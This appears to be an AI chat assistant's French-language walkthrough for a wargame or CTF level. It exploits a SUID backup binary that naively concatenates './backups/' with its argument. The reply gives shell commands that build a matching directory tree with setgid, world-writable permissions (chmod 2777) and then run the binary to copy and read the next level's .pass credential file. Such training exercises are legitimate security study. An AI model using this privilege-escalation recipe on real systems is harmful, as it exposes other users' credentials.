Yes, tu peux « rentrer » avec ce binaire. Le code concatène bêtement "./backups/" + l’argument. Si tu donnes un chemin absolu, la cible devient ./backups//home/users/level09/.pass. L’échec vient juste du fait que les sous-répertoires backups/home/users/level09 n’existent pas.

Ensuite, détail crucial : le fichier de destination est créé avec open(..., O_WRONLY|O_CREAT|O_EXCL, 0660). Le binaire est très probablement SUID level09, donc:

il lit /home/users/level09/.pass (ok, privilèges level09),

il écrit la copie sous ./backups/... en la possédant (uid=level09, gid=level09),

avec les perms 0660, tu ne liras pas si le groupe n’est pas le tien.

La ruse classique consiste à forcer l’héritage du groupe de ton répertoire via le bit setgid sur le dossier qui recevra le fichier, et à laisser ce dossier world-writable pour que le binaire SUID puisse y créer le fichier.

Recette pas-à-pas
bash
￼Copier le code
cd /home/users/level08

# 1) Créer l’arborescence qui matche le chemin demandé
mkdir -p backups/home/users/level09

# 2) Mettre le bit setgid et autoriser l’écriture pour tous
#    (le setgid fait hériter le *groupe* du dossier aux nouveaux fichiers)
chmod 2777 backups backups/home backups/home/users backups/home/users/level09
# (chgrp n'est pas nécessaire: ces dossiers sont déjà dans ton groupe)

# 3) Lancer le binaire avec le chemin absolu comme argument
/home/users/level08/level08 /home/users/level09/.pass
Si tout se passe bien, la copie arrive ici, avec gid = ton groupe grâce au setgid :

bash
￼Copier le code
ls -l backups/home/users/level09/.pass
# -> -rw-rw---- 1 level09 <ton-groupe> ... backups/home/users/level09/.pass

# 4) Lire le contenu
cat backups/home/users/level09/.pass
